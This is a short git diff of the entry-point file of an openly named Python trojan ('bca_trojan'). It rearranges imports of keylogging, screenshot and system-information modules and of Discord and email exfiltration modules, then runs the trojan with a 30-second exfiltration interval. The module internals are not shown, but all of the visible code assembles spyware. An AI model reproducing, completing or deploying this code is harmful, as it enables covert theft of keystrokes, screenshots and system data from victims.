@@ -4,12 +4,15 @@
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import os
-import sys
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 from typing import Union
 
+from src.modules.exfiltration import Discord, Email
+from src.modules.exploitation import KeyLogger, ScreenShot, SystemInformation
+
 import dotenv
+
 
 dotenv.load_dotenv()
 
@@ -33,9 +36,4 @@ def bca_trojan(*, exfil_time: float,
 
 
 if __name__ == "__main__":
-    sys.path.insert(0, str(Path(__file__).parents[1]))
-    from src.modules.exfiltration import Discord, Email
-    from src.modules.exploitation import KeyLogger, ScreenShot, \
-        SystemInformation
-
     bca_trojan(exfil_time=30, screenshot="/tmp/screenshot.png")
